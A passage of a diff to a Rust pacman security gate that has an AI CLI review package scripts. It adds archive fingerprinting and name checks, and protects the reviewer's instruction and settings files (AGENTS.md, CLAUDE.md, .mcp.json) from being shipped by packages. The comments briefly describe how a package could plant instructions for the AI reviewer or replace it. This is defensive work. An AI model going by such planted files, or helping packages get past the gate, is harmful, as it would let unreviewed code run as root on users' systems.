@@ -6,7 +6,9 @@
 //! kernel-install hooks run at every kernel update, and login scripts,
 //! autostart entries, cron jobs and D-Bus services run on their own
 //! schedule. The pacman gate reviews these with the AI alongside the
-//! scriptlet; the rest of the payload is not reviewed.
+//! scriptlet, and with them the package's own text files that the scriptlet
+//! or one of those files names (a script a hook hands to an interpreter, a
+//! file a login script sources); the rest of the payload is not reviewed.
 //!
 //! Every decision is made against one exact model of the archive: two full
 //! listings (names only, and details with numeric owners) zipped line by
@@ -17,25 +19,28 @@
 //! Links are resolved inside the model, never on disk, and only regular
 //! files are extracted, into a private directory, and read without
 //! following links. The archive is opened once; every pass reads that open
-//! file, and its path must still name it at the end.
+//! file, and its path must still name it, with the same bytes, once the
+//! review is over (see `Fingerprint`).
 
 use std::collections::{HashMap, HashSet};
 use std::ffi::OsString;
 use std::fs::{self, File, Metadata, OpenOptions};
-use std::io::Read;
+use std::io::{self, Read};
 use std::os::fd::AsRawFd;
 use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
 use std::path::{Path, PathBuf};
 
 use crate::autorun::{
-    executed_paths, is_alias_of_reviewed_directory, is_auto_run, is_auto_run_directory,
+    is_alias_of_reviewed_directory, is_auto_run_directory, is_reviewed, named_words,
+    sweep_only_location,
 };
 use crate::config::model::SourceClass;
-use crate::content::{self, Content};
+use crate::content::{self, Content, PROBE_SIZE, Prefix};
 use crate::error::{Error, IoContext};
 use crate::rules;
 use crate::sandbox::Workspace;
 use crate::scan::MAX_TEXT_FILE_SIZE;
+use crate::sha256::{Digest, Sha256};
 use crate::tools::{self, Limits};
 
 /// The archive's own metadata; any other name starting with `.` is refused.
@@ -47,6 +52,11 @@ const MAX_FILES: usize = 2000;
 const MAX_TOTAL: u64 = 32 * 1024 * 1024;
 /// Symbolic links followed from one entry before giving up.
 const MAX_HOPS: usize = 40;
+/// How far the package's own files are followed from its scriptlet and
+/// auto-run files (a hook names a script, which sources another), and how
+/// many of them: past either, the review is incomplete.
+const MAX_NAMED_DEPTH: usize = 3;
+const MAX_NAMED_FILES: usize = 500;
 
 const LISTING_LIMITS: Limits = Limits {
     timeout_secs: 300,
@@ -90,7 +100,13 @@ enum Owner {
 /// the tools it trusts. A trailing `/` protects the whole directory.
 const PROTECTED: &[(&str, Owner)] = &[
     ("etc/omarchy-guardian/", Owner::Nobody),
+    // Root's own mark that the gate is on (see the hook script), and the
+    // hook libalpm always loads.
     ("etc/pacman.d/hooks/omarchy-guardian.hook", Owner::Nobody),
+    (
+        "usr/share/libalpm/hooks/omarchy-guardian.hook",
+        Owner::Guardian,
+    ),
     ("usr/bin/omarchy-guardian", Owner::Guardian),
     ("usr/lib/omarchy-guardian/", Owner::Guardian),
     ("usr/share/omarchy-guardian/", Owner::Guardian),
@@ -99,6 +115,28 @@ const PROTECTED: &[(&str, Owner)] = &[
     ("usr/bin/claude", Owner::Packages(&["claude-code"])),
     ("usr/local/bin/claude", Owner::Packages(&["claude-code"])),
     ("opt/claude-code/", Owner::Packages(&["claude-code"])),
+    // What the reviewer reads as its own instructions and settings: the
+    // system-wide configuration of either CLI (neither package ships one),
+    // and the project files a CLI started in `/usr` or `/` would pick up.
+    // A name starting with `.` at the top of an archive is refused with
+    // the model already.
+    ("etc/opencode/", Owner::Nobody),
+    ("etc/claude-code/", Owner::Nobody),
+    ("usr/AGENTS.md", Owner::Nobody),
+    ("usr/CLAUDE.md", Owner::Nobody),
+    ("usr/CLAUDE.local.md", Owner::Nobody),
+    ("usr/CONTEXT.md", Owner::Nobody),
+    ("usr/opencode.json", Owner::Nobody),
+    ("usr/opencode.jsonc", Owner::Nobody),
+    ("usr/.mcp.json", Owner::Nobody),
+    ("usr/.opencode/", Owner::Nobody),
+    ("usr/.claude/", Owner::Nobody),
+    ("AGENTS.md", Owner::Nobody),
+    ("CLAUDE.md", Owner::Nobody),
+    ("CLAUDE.local.md", Owner::Nobody),
+    ("CONTEXT.md", Owner::Nobody),
+    ("opencode.json", Owner::Nobody),
+    ("opencode.jsonc", Owner::Nobody),
     ("usr/bin/bsdtar", Owner::Official),
     ("usr/bin/pacman", Owner::Official),
     ("usr/bin/pacman-conf", Owner::Official),
@@ -116,6 +154,8 @@ const PROTECTED: &[(&str, Owner)] = &[
     ("usr/bin/id", Owner::Official),
     ("usr/bin/getent", Owner::Official),
     ("usr/bin/cut", Owner::Official),
+    // Reads what pacman recorded of the installed packages' links.
+    ("usr/bin/gzip", Owner::Official),
 ];
 
 /// Top-level directories no package installs files into: runtime and
@@ -127,10 +167,95 @@ const NOT_FOR_PACKAGES: &[&str] = &["run/", "tmp/", "dev/", "proc/", "sys/", "ro
 /// The directory links every system has (`/bin` is `usr/bin`): an entry
 /// listed under one would replace the link with a directory of its own.
 const ROOT_LINKS: &[&str] = &["bin/", "sbin/", "lib/", "lib64/"];
+/// The same inside `/usr`: `usr/sbin` is `bin` and `usr/lib64` is `lib`.
+/// The `filesystem` package ships the links themselves, never an entry
+/// under one.
+const USR_LINKS: &[&str] = &["usr/sbin/", "usr/lib64/"];
 
-/// What other packages a `.PKGINFO` may not claim to replace, conflict
-/// with or provide: pacman would then remove Guardian for it.
-const NOT_REPLACEABLE: &str = "omarchy-guardian";
+/// `path` (relative to `/`) as the system reads it through those links:
+/// `bin/sh` and `usr/sbin/sh` are `usr/bin/sh`.
+pub fn through_root_links(path: &str) -> String {
+    for (link, leads) in [
+        ("bin/", "usr/bin/"),
+        ("sbin/", "usr/bin/"),
+        ("lib/", "usr/lib/"),
+        ("lib64/", "usr/lib/"),
+        ("usr/sbin/", "usr/bin/"),
+        ("usr/lib64/", "usr/lib/"),
+    ] {
+        if let Some(rest) = path.strip_prefix(link) {
+            return format!("{leads}{rest}");
+        }
+    }
+    path.to_string()
+}
+
+/// Guardian's own package. What other packages a `.PKGINFO` may not claim
+/// to replace, conflict with or provide: pacman would then remove Guardian
+/// for it.
+const GUARDIAN: &str = "omarchy-guardian";
+/// What a package of that name must ship to be Guardian: an "upgrade" to
+/// one without its program or hook script takes the gate away.
+const GUARDIAN_FILES: &[&str] = &[
+    "usr/bin/omarchy-guardian",
+    "usr/lib/omarchy-guardian/guardian-pacman-hook",
+];
+/// The packages of the reviewer CLIs, as `PROTECTED` names them.
+const REVIEWERS: &[&str] = &["opencode", "claude-code"];
+
+/// Why a package named `package` (of `class`) may not be installed at all:
+/// a package of Guardian's name, or of its reviewer's, replaces the
+/// installed one whatever it ships, an empty one included.
+fn name_violation(package: &str, class: SourceClass, trusted: &[String]) -> Option<String> {
+    if package == GUARDIAN && class == SourceClass::ThirdPartyRepo {
+        return Some(format!(
+            "{package} is offered by a third-party repository: Guardian is installed from a local archive or an official repository only, and a package of its name would replace it"
+        ));
+    }
+    if REVIEWERS.contains(&package)
+        && class != SourceClass::Official
+        && !trusted.iter().any(|name| name == package)
+    {
+        return Some(format!(
+            "{package} does not come from an official repository: a package of that name would replace Guardian's reviewer (name it in [pacman] trusted_reviewer_packages to allow it)"
+        ));
+    }
+    None
+}
+
+/// The first line of `pkginfo` by which `package` claims the place of
+/// Guardian or of its reviewer (`replaces`, `conflict`, `provides`), with
+/// what it would take away. Guardian is nobody else's to claim; a reviewer
+/// may be claimed by a package that could ship it (see `PROTECTED`).
+fn claim_violation<'a>(
+    pkginfo: &'a str,
+    package: &str,
+    class: SourceClass,
+    trusted: &[String],
+) -> Option<(&'a str, &'static str)> {
+    let may_ship_reviewer =
+        class == SourceClass::Official || trusted.iter().any(|name| name == package);
+    pkginfo.lines().find_map(|line| {
+        let claimed = ["replaces = ", "conflict = ", "provides = "]
+            .iter()
+            .find_map(|key| line.strip_prefix(key))?
+            .trim()
+            .split(['<', '>', '='])
+            .next()
+            .map(str::trim)?;
+        if claimed == package {
+            None
+        } else if claimed == GUARDIAN {
+            Some((line.trim(), "Guardian"))
+        } else if (REVIEWERS.contains(&claimed) || trusted.iter().any(|name| name == claimed))
+            && !may_ship_reviewer
+        {
+            Some((line.trim(), "Guardian's reviewer"))
+        } else {
+            None
+        }
+    })
+}
 
 /// Whether `package` (of `class`) may ship `path`; `trusted` names extra
 /// reviewer packages the root-owned system configuration allows.
@@ -316,7 +441,7 @@ fn attributes_in_tar(mut stream: impl Read) -> Result<Vec<Attribute>, String> {
     let mut header = [0_u8; 512];
     loop {
         if let Err(error) = stream.read_exact(&mut header) {
-            return if error.kind() == std::io::ErrorKind::UnexpectedEof {
+            return if error.kind() == io::ErrorKind::UnexpectedEof {
                 Ok(found)
             } else {
                 Err(error.to_string())
@@ -595,12 +720,16 @@ pub struct Archive {
     capabilities: HashMap<String, String>,
 }
 
+/// Which file a path names, and when it was last written or changed. The
+/// change time is the kernel's own: a write in place moves it, and nobody
+/// but root (by setting the clock) can move it back.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 struct Identity {
     dev: u64,
     ino: u64,
     size: u64,
-    mtime: i64,
+    mtime: (i64, i64),
+    ctime: (i64, i64),
 }
 
 impl Identity {
@@ -609,9 +738,101 @@ impl Identity {
             dev: metadata.dev(),
             ino: metadata.ino(),
             size: metadata.len(),
-            mtime: metadata.mtime(),
+            mtime: (metadata.mtime(), metadata.mtime_nsec()),
+            ctime: (metadata.ctime(), metadata.ctime_nsec()),
         }
     }
+}
+
+/// What an archive was when its review began: the file its path named and
+/// the SHA-256 of its bytes. The AI review takes minutes, and an archive
+/// given to `pacman -U` may lie where its owner can rewrite it in place
+/// meanwhile; `verify` is asked again once the review is over.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct Fingerprint {
+    path: PathBuf,
+    identity: Identity,
+    /// Not taken of a file only root can write (see `root_alone`).
+    digest: Option<Digest>,
+}
+
+/// Whether only root can write the file at `path` or put another in its
+/// place: it and every directory above it are root's, and not writable by
+/// a group or by everyone. That is pacman's own cache, where a system
+/// upgrade keeps gigabytes of archives: whoever rewrites one of those is
+/// root already, so they are told apart by the file and its change time
+/// alone, without hashing each twice.
+fn root_alone(path: &Path, file: &Metadata) -> bool {
+    let roots = |metadata: &Metadata| metadata.uid() == 0 && metadata.mode() & 0o022 == 0;
+    roots(file)
+        && path.is_absolute()
+        && path.ancestors().skip(1).all(|directory| {
+            fs::symlink_metadata(directory)
+                .is_ok_and(|metadata| metadata.is_dir() && roots(&metadata))
+        })
+}
+
+impl Fingerprint {
+    /// The path must still name the same file, unchanged, holding the same
+    /// bytes.
+    pub fn verify(&self) -> Result<(), Error> {
+        let changed = || {
+            Error::Refused(format!(
+                "{} changed while it was being reviewed",
+                self.path.display()
+            ))
+        };
+        let file = OpenOptions::new()
+            .read(true)
+            .custom_flags(O_NOFOLLOW | O_NONBLOCK)
+            .open(&self.path)
+            .map_err(|_| changed())?;
+        let same = |metadata: io::Result<Metadata>| {
+            metadata.is_ok_and(|metadata| {
+                metadata.is_file() && Identity::of(&metadata) == self.identity
+            })
+        };
+        if !same(file.metadata())
+            || self
+                .digest
+                .is_some_and(|digest| digest_of(&file).ok() != Some(digest))
+        {
+            return Err(changed());
+        }
+        // Hashing took its time too: still that file, not written since.
+        if same(fs::symlink_metadata(&self.path)) {
+            Ok(())
+        } else {
+            Err(changed())
+        }
+    }
+}
+
+/// The SHA-256 of everything `file` holds from where it stands, read in
+/// pieces: an archive may be gigabytes.
+fn digest_of(mut file: &File) -> io::Result<Digest> {
+    let mut hasher = Sha256::new();
+    let mut buffer = vec![0_u8; 1 << 16];
+    loop {
+        match file.read(&mut buffer) {
+            Ok(0) => return Ok(hasher.finalize()),
+            Ok(count) => hasher.update(&buffer[..count]),
+            Err(error) if error.kind() == io::ErrorKind::Interrupted => {}
+            Err(error) => return Err(error),
+        }
+    }
+}
+
+/// What an archive puts where a link on the system leads (see
+/// `Archive::replacement`).
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum Replacement {
+    /// A file small enough to read, with its bytes.
+    File(Vec<u8>),
+    /// A larger file that is no text, by what it is.
+    Binary(&'static str),
+    /// Something that cannot be read, and why.
+    Unreadable(&'static str),
 }
 
 impl Archive {
@@ -706,8 +927,7 @@ impl Archive {
             .take()
             .ok_or_else(|| failed("no output".into()))
             .and_then(|stdout| {
-                attributes_in_tar(std::io::BufReader::with_capacity(1 << 16, stdout))
-                    .map_err(failed)
+                attributes_in_tar(io::BufReader::with_capacity(1 << 16, stdout)).map_err(failed)
             });
         let status = child
             .wait()
@@ -735,6 +955,188 @@ impl Archive {
                 detail: format!("{}: {}", self.path.display(), captured.failure_detail()),
             })
         }
+    }
+
+    /// The first `PROBE_SIZE` bytes of each of `paths` (regular files of
+    /// the model), enough to tell text from a compiled program, in one
+    /// pass over the archive and without writing a large file anywhere:
+    /// bsdtar prints the files one after another in archive order, and
+    /// the model says how long each is.
+    fn heads(&self, paths: &[String]) -> Result<HashMap<String, Vec<u8>>, Error> {
+        if paths.is_empty() {
+            return Ok(HashMap::new());
+        }
+        let failed = |detail: String| Error::ToolFailed {
+            tool: "bsdtar".into(),
+            detail: format!("{}: {detail}", self.path.display()),
+        };
+        let mut ordered: Vec<(usize, &String)> = paths
+            .iter()
+            .filter_map(|path| Some((*self.index.get(path)?, path)))
+            .collect();
+        ordered.sort();
+        ordered.dedup();
+        let stdin = File::open(format!("/proc/self/fd/{}", self.file.as_raw_fd())).at(&self.path)?;
+        let mut command = std::process::Command::new(tools::TIMEOUT);
+        command
+            .arg("--signal=TERM")
+            .arg("--kill-after=5s")
+            .arg(format!("{}s", EXTRACT_LIMITS.timeout_secs))
+            .arg(tools::BSDTAR)
+            .args(["-x", "-O", "-f", "-"]);
+        for (_, path) in &ordered {
+            command.arg("--include").arg(escape_pattern(path));
+        }
+        let mut child = command
+            .env("LC_ALL", "C")
+            .stdin(stdin)
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::null())
+            .spawn()
+            .map_err(|source| Error::Spawn {
+                tool: "bsdtar".into(),
+                source,
+            })?;
+        let heads = child
+            .stdout
+            .take()
+            .ok_or_else(|| "no output".to_string())
+            .and_then(|stdout| {
+                let mut stream = io::BufReader::with_capacity(1 << 16, stdout);
+                let mut heads = HashMap::new();
+                for (index, path) in &ordered {
+                    let size = self.entries[*index].size;
+                    let mut head = Vec::new();
+                    let kept = (&mut stream)
+                        .take(size.min(PROBE_SIZE as u64))
+                        .read_to_end(&mut head)
+                        .map_err(|error| error.to_string())?;
+                    let skipped =
+                        io::copy(&mut (&mut stream).take(size - kept as u64), &mut io::sink())
+                            .map_err(|error| error.to_string())?;
+                    if kept as u64 + skipped != size {
+                        return Err(format!("/{path} is shorter than listed"));
+                    }
+                    heads.insert((*path).clone(), head);
+                }
+                // Anything more is a file the model does not know.
+                let mut more = [0_u8; 1];
+                match stream.read(&mut more) {
+                    Ok(0) => Ok(heads),
+                    _ => Err("more was extracted than the listing names".to_string()),
+                }
+            });
+        let status = child
+            .wait()
+            .map_err(|error| failed(format!("could not wait for exit: {error}")))?;
+        let heads = heads.map_err(failed)?;
+        if !status.success() {
+            return Err(failed("could not be read through for its files".into()));
+        }
+        Ok(heads)
+    }
+
+    /// The archive as it is now, to compare with once the review is over.
+    /// Unless the file is root's alone, the whole of it is hashed, through
+    /// the descriptor it was opened with.
+    pub fn fingerprint(&self) -> Result<Fingerprint, Error> {
+        let digest = if root_alone(&self.path, &self.file.metadata().at(&self.path)?) {
+            None
+        } else {
+            let file =
+                File::open(format!("/proc/self/fd/{}", self.file.as_raw_fd())).at(&self.path)?;
+            Some(digest_of(&file).at(&self.path)?)
+        };
+        Ok(Fingerprint {
+            path: self.path.clone(),
+            identity: self.identity,
+            digest,
+        })
+    }
+
+    /// The regular file whose content is installed at `path`: itself, the
+    /// original of a hard link, or what a symbolic link leads to inside
+    /// the package.
+    fn regular_at(&self, path: &str) -> Option<String> {
+        match &self.entry(path)?.kind {
+            Kind::File => Some(path.to_string()),
+            Kind::HardLink(original) => Some(original.clone()),
+            Kind::Symlink(target) => match self.resolve(path, target) {
+                Ok(Resolution::Regular(resolved)) => Some(resolved),
+                _ => None,
+            },
+            Kind::Directory => None,
+        }
+    }
+
+    /// The regular files of this archive that `text` names: by a path
+    /// (`/usr/lib/pkg/setup.sh`, also behind a variable or a prefix, as in
+    /// `$pkgdir/usr/lib/pkg/setup.sh` or `-/usr/lib/pkg/pre`), or by a bare
+    /// name the package ships in `usr/bin`.
+    fn named_in(&self, text: &str) -> Vec<String> {
+        let mut found = Vec::new();
+        let mut seen = HashSet::new();
+        for word in named_words(text) {
+            // The end of a sentence, or of a directory's name.
+            let word = word.trim_end_matches(['.', '/']);
+            let named = if word.contains('/') {
+                // The word itself, then every tail of it that starts
+                // after a `/`: the longest that the package ships.
+                std::iter::once(word)
+                    .chain(word.match_indices('/').map(|(at, _)| &word[at + 1..]))
+                    .filter(|tail| tail.contains('/'))
+                    .find_map(|tail| self.regular_at(&through_root_links(tail)))
+            } else {
+                self.regular_at(&format!("usr/bin/{word}"))
+            };
+            if let Some(path) = named
+                && seen.insert(path.clone())
+            {
+                found.push(path);
+            }
+        }
+        found
+    }
+
+    /// What this archive installs at `path` (no leading `/`), for a link
+    /// on the system that leads there and is read as an auto-run file:
+    /// `None` when it ships no file there.
+    pub fn replacement(&self, path: &str) -> Option<Replacement> {
+        let regular = match &self.entry(path)?.kind {
+            Kind::Directory => return None,
+            Kind::Symlink(_) => match self.regular_at(path) {
+                Some(regular) => regular,
+                None => {
+                    return Some(Replacement::Unreadable(
+                        "is a symbolic link out of the package",
+                    ));
+                }
+            },
+            Kind::File | Kind::HardLink(_) => self.regular_source(path),
+        };
+        let size = self.entry(&regular).map_or(0, |entry| entry.size);
+        if size <= MAX_TEXT_FILE_SIZE {
+            return Some(
+                self.extract(std::slice::from_ref(&regular))
+                    .ok()
+                    .and_then(|mut read| read.remove(&regular))
+                    .map_or(
+                        Replacement::Unreadable("could not be read from the archive"),
+                        Replacement::File,
+                    ),
+            );
+        }
+        let heads = self.heads(std::slice::from_ref(&regular)).ok();
+        let head = heads.as_ref().and_then(|heads| heads.get(&regular));
+        Some(
+            match head.map(|head| content::classify_prefix(path, false, head)) {
+                Some(Prefix::Binary(format)) => Replacement::Binary(format.label()),
+                Some(Prefix::Text | Prefix::Undecodable) => {
+                    Replacement::Unreadable("is text over the 2 MiB review limit")
+                }
+                None => Replacement::Unreadable("could not be read from the archive"),
+            },
+        )
     }
 
     /// The file capabilities the archive gives `path` (see
@@ -807,6 +1209,19 @@ impl Archive {
                                 "bin"
                             };
                             parts = vec!["usr".to_string(), leads.to_string()];
+                        }
+                        // The same for `/usr/sbin` and `/usr/lib64`.
+                        if parts.len() == 2
+                            && parts[0] == "usr"
+                            && USR_LINKS.contains(&format!("usr/{name}/").as_str())
+                            && self.entry(&format!("usr/{name}")).is_none()
+                        {
+                            parts[1] = if name.starts_with("lib") {
+                                "lib"
+                            } else {
+                                "bin"
+                            }
+                            .to_string();
                         }
                         let last = components[index + 1..]
                             .iter()
@@ -922,7 +1337,7 @@ fn escape_pattern(path: &str) -> String {
 
 /// Reads `rel` under `root` one component at a time, refusing any symbolic
 /// link on the way and anything but a regular file at the end.
-fn read_extracted(root: &Path, rel: &str) -> std::io::Result<Vec<u8>> {
+fn read_extracted(root: &Path, rel: &str) -> io::Result<Vec<u8>> {
     let mut path = root.to_path_buf();
     let components: Vec<&str> = rel.split('/').collect();
     for (index, component) in components.iter().enumerate() {
@@ -930,7 +1345,7 @@ fn read_extracted(root: &Path, rel: &str) -> std::io::Result<Vec<u8>> {
         let metadata = fs::symlink_metadata(&path)?;
         let last = index + 1 == components.len();
         if metadata.file_type().is_symlink() || (!last && !metadata.is_dir()) {
-            return Err(std::io::Error::other("not a plain path in the extraction"));
+            return Err(io::Error::other("not a plain path in the extraction"));
         }
     }
     let file = OpenOptions::new()
@@ -938,7 +1353,7 @@ fn read_extracted(root: &Path, rel: &str) -> std::io::Result<Vec<u8>> {
         .custom_flags(O_NOFOLLOW | O_NONBLOCK)
         .open(&path)?;
     if !file.metadata()?.is_file() {
-        return Err(std::io::Error::other("not a regular file"));
+        return Err(io::Error::other("not a regular file"));
     }
     let mut bytes = Vec::new();
     file.take(MAX_TEXT_FILE_SIZE + 1).read_to_end(&mut bytes)?;
@@ -950,8 +1365,10 @@ fn read_extracted(root: &Path, rel: &str) -> std::io::Result<Vec<u8>> {
 pub struct PayloadFile {
     pub path: String,
     pub content: Content,
-    /// For a program a reviewed hook or unit runs: that file.
-    pub run_by: Option<String>,
+    /// For a file of the package that reviewed files name (a script a hook
+    /// runs, a file a login script sources): those files, `.INSTALL` for
+    /// the scriptlet. Empty for an auto-run file.
+    pub run_by: Vec<String>,
     /// For a link to a file this package does not ship: that file's path,
     /// for the caller to find where the transaction or the system has it.
     pub leads_outside: Option<String>,
@@ -969,7 +1386,7 @@ enum Shipped {
         target: String,
         content: Option<Vec<u8>>,
     },
-    /// A script another reviewed file runs: always reviewed.
+    /// Not read: a compiled program, or a link out of the package.
     Unknown,
 }
 
@@ -1009,6 +1426,16 @@ pub struct Review {
     /// Files installed setuid or setgid root, with which of the two, but
     /// for the sandbox helper of a Chromium-based program.
     pub root_set_id: Vec<(String, &'static str)>,
+    /// What the scriptlet or an auto-run file names and could not be
+    /// followed to, each as a sentence: the review is incomplete.
+    pub unfollowed: Vec<String>,
+    /// For a package that is not from an official repository: its files
+    /// where only the sweep looks (a PAM module, the boot loader's
+    /// configuration), with when what is there runs.
+    pub misplaced: Vec<(String, &'static str)>,
+    /// The regular files read as auto-run files: those themselves, and
+    /// what the package's auto-run links lead to inside it.
+    pub read_as_auto_run: HashSet<String>,
 }
 
 /// An auto-run entry and what its content is read from.
@@ -1026,6 +1453,20 @@ pub fn review(
     trusted: &[String],
 ) -> Result<Review, Error> {
     let refuse = |reason: String| Error::Refused(format!("{}: {reason}", archive.path.display()));
+    if let Some(reason) = name_violation(package, class, trusted) {
+        return Err(refuse(reason));
+    }
+    if package == GUARDIAN
+        && let Some(missing) = GUARDIAN_FILES.iter().find(|path| {
+            !archive
+                .entry(path)
+                .is_some_and(|entry| entry.kind == Kind::File)
+        })
+    {
+        return Err(refuse(format!(
+            "{package} does not ship /{missing}: installing it would take Guardian away"
+        )));
+    }
     for entry in &archive.entries {
         if let Some(reason) = protected_violation(&entry.path, package, class, trusted) {
             return Err(refuse(reason));
@@ -1042,6 +1483,7 @@ pub fn review(
         }
         if let Some(link) = ROOT_LINKS
             .iter()
+            .chain(USR_LINKS)
             .find(|link| entry.path.starts_with(**link))
         {
             return Err(refuse(format!(
@@ -1052,24 +1494,9 @@ pub fn review(
         }
     }
 
-    let (wanted, sources) = plan_reads(archive).map_err(refuse)?;
+    let official = class == SourceClass::Official;
+    let (wanted, sources) = plan_reads(archive, official).map_err(refuse)?;
     let mut read = archive.extract(&wanted)?;
-
-    // Scripts that reviewed hooks and units run, when this package ships
-    // them, are reviewed as well (read in a second, bounded extraction).
-    let executed = executed_scripts(archive, &sources, &read);
-    if !executed.is_empty() {
-        let mut more: Vec<String> = executed
-            .iter()
-            .map(|(program, _)| archive.regular_source(program))
-            .collect();
-        more.sort();
-        more.dedup();
-        let mut all = wanted.clone();
-        all.extend(more.iter().cloned());
-        check_limits(archive, &all, sources.len() + executed.len()).map_err(refuse)?;
-        read.extend(archive.extract(&more)?);
-    }
 
     let pkginfo =
         String::from_utf8_lossy(read.get(".PKGINFO").map_or(&[][..], Vec::as_slice)).into_owned();
@@ -1083,42 +1510,21 @@ pub fn review(
             declared.unwrap_or_default()
         )));
     }
-    if package != NOT_REPLACEABLE
-        && let Some(claim) = pkginfo.lines().find(|line| {
-            ["replaces = ", "conflict = ", "provides = "]
-                .iter()
-                .filter_map(|key| line.strip_prefix(key))
-                .any(|value| {
-                    value.trim().split(['<', '>', '=']).next().map(str::trim)
-                        == Some(NOT_REPLACEABLE)
-                })
-        })
-    {
+    if let Some((claim, what)) = claim_violation(&pkginfo, package, class, trusted) {
         return Err(refuse(format!(
-            "{package} declares `{}`: installing it would remove or stand in for Guardian",
-            claim.trim()
+            "{package} declares `{claim}`: installing it would remove or stand in for {what}"
         )));
     }
+
+    // The package's own files that the scriptlet and the auto-run files
+    // name are reviewed with them (read in further, bounded passes).
+    let (named, unfollowed) = named_files(archive, &sources, &wanted, &mut read)?;
 
     let install = read
         .get(".INSTALL")
         .map(|bytes| content::classify(".INSTALL", false, true, bytes));
     let mut files = payload_files(&sources, &read);
-    for (program, by) in executed {
-        let bytes = read
-            .get(&archive.regular_source(&program))
-            .map_or(&[][..], Vec::as_slice);
-        files.push(PayloadFile {
-            content: annotated(
-                content::classify_payload(&program, bytes),
-                &format!("# /{program}, run by /{by}\n"),
-            ),
-            path: program,
-            run_by: Some(by),
-            leads_outside: None,
-            shipped: Shipped::Unknown,
-        });
-    }
+    files.extend(named);
     files.sort_by(|left, right| left.path.cmp(&right.path));
     let root_set_id = archive
         .entries
@@ -1126,10 +1532,25 @@ pub fn review(
         .filter(|entry| !is_chromium_helper(archive, &entry.path))
         .filter_map(|entry| Some((entry.path.clone(), entry.root_set_id?)))
         .collect();
+    let misplaced = archive
+        .entries
+        .iter()
+        .filter(|entry| !official && !matches!(entry.kind, Kind::Directory))
+        .filter_map(|entry| {
+            let location = sweep_only_location(&entry.path)?;
+            Some((entry.path.clone(), location.category.when()))
+        })
+        .collect();
     Ok(Review {
         install,
         files,
         root_set_id,
+        unfollowed,
+        misplaced,
+        read_as_auto_run: wanted
+            .into_iter()
+            .filter(|path| !METADATA.contains(&path.as_str()))
+            .collect(),
     })
 }
 
@@ -1181,7 +1602,7 @@ fn is_chromium_helper(archive: &Archive, path: &str) -> bool {
 /// The files to extract (`.PKGINFO`, `.INSTALL`, the auto-run entries and
 /// what their links resolve to), within the limits, and each auto-run
 /// entry's source.
-fn plan_reads(archive: &Archive) -> Result<(Vec<String>, Vec<Source<'_>>), String> {
+fn plan_reads(archive: &Archive, official: bool) -> Result<(Vec<String>, Vec<Source<'_>>), String> {
     let mut wanted: Vec<String> = Vec::new();
     match archive.entry(".PKGINFO") {
         Some(entry) if entry.size <= MAX_TEXT_FILE_SIZE => wanted.push(".PKGINFO".into()),
@@ -1213,7 +1634,7 @@ fn plan_reads(archive: &Archive) -> Result<(Vec<String>, Vec<Source<'_>>), Strin
                 entry.path
             ));
         }
-        if matches!(entry.kind, Kind::Directory) || !is_auto_run(&entry.path) {
+        if matches!(entry.kind, Kind::Directory) || !is_reviewed(&entry.path, official) {
             continue;
         }
         let source = match &entry.kind {
@@ -1231,41 +1652,187 @@ fn plan_reads(archive: &Archive) -> Result<(Vec<String>, Vec<Source<'_>>), Strin
     Ok((wanted, sources))
 }
 
-/// Shipped, non-auto-run scripts that the reviewed hooks and units run,
-/// with the file that runs each.
-fn executed_scripts(
+/// The package's own files that its scriptlet and auto-run files name, and
+/// the files those name in turn: text is read (into `read`) and returned
+/// for the review, a compiled program is returned as what it is. The
+/// second list says what could not be followed: text over the size limit,
+/// more files or more steps than the bounds allow.
+fn named_files(
     archive: &Archive,
     sources: &[Source<'_>],
+    wanted: &[String],
+    read: &mut HashMap<String, Vec<u8>>,
+) -> Result<(Vec<PayloadFile>, Vec<String>), Error> {
+    // What is reviewed as itself already.
+    let mut known: HashSet<&str> = wanted.iter().map(String::as_str).collect();
+    known.extend(sources.iter().map(|(entry, _)| entry.path.as_str()));
+    // Who names, and the file its text was read from.
+    let mut naming: Vec<(String, String)> = read
+        .contains_key(".INSTALL")
+        .then(|| (".INSTALL".to_string(), ".INSTALL".to_string()))
+        .into_iter()
+        .collect();
+    naming.extend(sources.iter().filter_map(|(entry, source)| match source {
+        Resolution::Regular(path) => Some((entry.path.clone(), path.clone())),
+        Resolution::Outside(_) => None,
+    }));
+
+    let mut total: u64 = wanted
+        .iter()
+        .filter_map(|path| archive.entry(path))
+        .map(|entry| entry.size)
+        .sum();
+    let mut by: HashMap<String, Vec<String>> = HashMap::new();
+    let mut found: Vec<(String, Content, Shipped)> = Vec::new();
+    let mut unfollowed = Vec::new();
+    for depth in 0..=MAX_NAMED_DEPTH {
+        let mut fresh = newly_named(archive, &naming, read, &known, &mut by);
+        if fresh.is_empty() {
+            break;
+        }
+        let first_namer = |path: &str| {
+            by.get(path)
+                .and_then(|namers| namers.first())
+                .map_or_else(String::new, |namer| shown(namer))
+        };
+        let room = if depth == MAX_NAMED_DEPTH {
+            unfollowed.push(format!(
+                "/{}, which {} names, is more than {MAX_NAMED_DEPTH} files away from what runs on its own: it and {} more were not followed",
+                fresh[0],
+                first_namer(&fresh[0]),
+                fresh.len() - 1
+            ));
+            0
+        } else {
+            MAX_NAMED_FILES.saturating_sub(found.len())
+        };
+        if fresh.len() > room && depth < MAX_NAMED_DEPTH {
+            unfollowed.push(format!(
+                "the scriptlet and auto-run files name more than {MAX_NAMED_FILES} of the package's own files: /{} and {} more were not looked at",
+                fresh[room],
+                fresh.len() - room - 1
+            ));
+        }
+        fresh.truncate(room);
+
+        // Text or not, by the first bytes; only text is read whole.
+        let heads = archive.heads(&fresh)?;
+        let mut texts = Vec::new();
+        for path in &fresh {
+            let size = archive.entry(path).map_or(0, |entry| entry.size);
+            let head = heads.get(path).map_or(&[][..], Vec::as_slice);
+            let too_much = match content::classify_prefix(path, false, head) {
+                Prefix::Binary(format) => {
+                    found.push((path.clone(), Content::Binary(format), Shipped::Unknown));
+                    continue;
+                }
+                Prefix::Text | Prefix::Undecodable if size > MAX_TEXT_FILE_SIZE => {
+                    "is text over the 2 MiB review limit"
+                }
+                Prefix::Text | Prefix::Undecodable if total + size > MAX_TOTAL => {
+                    "would take the package past the size all its reviewed files may have"
+                }
+                Prefix::Text | Prefix::Undecodable => {
+                    total += size;
+                    texts.push(path.clone());
+                    continue;
+                }
+            };
+            unfollowed.push(format!(
+                "/{path}, which {} names, {too_much}",
+                first_namer(path)
